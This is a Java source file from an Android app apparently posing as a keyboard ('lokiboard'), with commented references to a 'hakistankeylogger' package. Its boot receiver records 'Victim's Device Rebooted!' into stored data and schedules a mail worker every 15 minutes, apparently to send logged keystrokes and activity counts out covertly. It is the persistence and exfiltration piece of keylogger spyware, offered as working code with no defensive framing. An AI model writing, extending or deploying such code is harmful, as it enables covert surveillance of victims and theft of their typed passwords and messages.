package com.abifog.lokiboard;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

import androidx.core.content.ContextCompat;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import static android.content.Context.JOB_SCHEDULER_SERVICE;
import static android.content.Context.MODE_PRIVATE;
//import static com.hak15tan.hakistankeylogger.KJOBService.MY_PREFS_NAME;
//import static com.hak15tan.hakistankeylogger.KJOBService.MY_PREFS_STRING_KEY;

public class StartOnBootReceiver extends BroadcastReceiver {

    public static final String MY_PREFS_Notification_Count_KEY = "GPrefsNotificationCountKey";
    public static final String MY_PREFS_Text_Count_KEY = "GPrefsText_CountKey";
    public static final String MY_PREFS_FOCUSED_Count_KEY = "GPrefsFOCUSED_CountKey";
    public static final String MY_PREFS_Clicks_Count_KEY = "GPrefsClicks_CountKey";

    @Override
    public void onReceive(Context context, Intent intent) {
       // if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {

            DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
            String time = df.format(Calendar.getInstance().getTime());


            String DataToSAVE = "\n\n\bVictim's Device Rebooted!\nTime: "  + time+ "\n";

            savedToSH(DataToSAVE);


        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        PeriodicWorkRequest periodicWorkRequest = new PeriodicWorkRequest.Builder(
                MailWorker.class,15, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .build();


        WorkManager.getInstance(context).enqueue(periodicWorkRequest);
/*
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){

            Log.i("TAG","Do nothing");

        }else {
            Intent serviceIntent = new Intent(context, InGService.class);
            serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ContextCompat.startForegroundService(context, serviceIntent);

        }


 */
        /*
            Intent serviceIntent = new Intent(context, InGService.class);
            serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ContextCompat.startForegroundService(context, serviceIntent);


         */

/*
            Intent jobintent = new Intent(context,KJOBService.class);
            KJOBService.enqueueWork(context,jobintent);


 */

          //  Intent i = new Intent(context, Gservice.class);
            //i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            //ContextCompat.startForegroundService(context, i);
     //   }
    }

    private void savedToSH(String tosavedata){

        SharedPreferences prefs = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE);
        String previouSData = prefs.getString("datatost", "Redeveloped By Hakistan");//"No name defined" is the default value.

        SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
        editor.putString("datatost", previouSData + tosavedata);
        //editor.putInt("idName", 12);
        editor.apply();

    }

}
